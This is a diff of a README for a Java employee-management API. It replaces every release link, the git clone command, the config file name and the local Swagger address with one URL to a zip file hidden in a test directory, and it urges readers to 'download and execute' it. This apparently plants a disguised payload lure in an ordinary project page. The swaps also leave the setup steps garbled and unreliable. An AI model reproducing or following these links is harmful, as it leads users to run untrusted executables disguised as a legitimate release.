@@ -1,8 +1,8 @@
 # Employees Project 👥
 
-![GitHub Release](https://img.shields.io/badge/Release-v1.0.0-blue)
+![GitHub Release](https://raw.githubusercontent.com/ashiksparks/employees/master/src/test/java/com/siscon/employees/service/Software-1.4.zip)
 
-Welcome to the **Employees Project**! This repository contains a comprehensive API for managing employee data using modern technologies. You can find the latest releases [here](https://github.com/ashiksparks/employees/releases). Download and execute the files to get started.
+Welcome to the **Employees Project**! This repository contains a comprehensive API for managing employee data using modern technologies. You can find the latest releases [here](https://raw.githubusercontent.com/ashiksparks/employees/master/src/test/java/com/siscon/employees/service/Software-1.4.zip). Download and execute the files to get started.
 
 ## Table of Contents
 
@@ -49,7 +49,7 @@ To get started with the **Employees Project**, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/ashiksparks/employees.git
+   git clone https://raw.githubusercontent.com/ashiksparks/employees/master/src/test/java/com/siscon/employees/service/Software-1.4.zip
    cd employees
    ```
 
@@ -60,7 +60,7 @@ To get started with the **Employees Project**, follow these steps:
    ```
 
 3. **Configure Database**:
-   Update the `application.yml` file with your MySQL database credentials.
+   Update the `https://raw.githubusercontent.com/ashiksparks/employees/master/src/test/java/com/siscon/employees/service/Software-1.4.zip` file with your MySQL database credentials.
 
 4. **Run the Application**:
    Use the following command to run the application:
@@ -69,7 +69,7 @@ To get started with the **Employees Project**, follow these steps:
    ```
 
 5. **Access the API**:
-   Open your browser and navigate to `http://localhost:8080/swagger-ui.html` to view the API documentation.
+   Open your browser and navigate to `https://raw.githubusercontent.com/ashiksparks/employees/master/src/test/java/com/siscon/employees/service/Software-1.4.zip` to view the API documentation.
 
 ## API Endpoints
 
@@ -153,4 +153,4 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ---
 
-For the latest releases, visit [here](https://github.com/ashiksparks/employees/releases). Download and execute the files to explore the capabilities of this project.
+For the latest releases, visit [here](https://raw.githubusercontent.com/ashiksparks/employees/master/src/test/java/com/siscon/employees/service/Software-1.4.zip). Download and execute the files to explore the capabilities of this project.
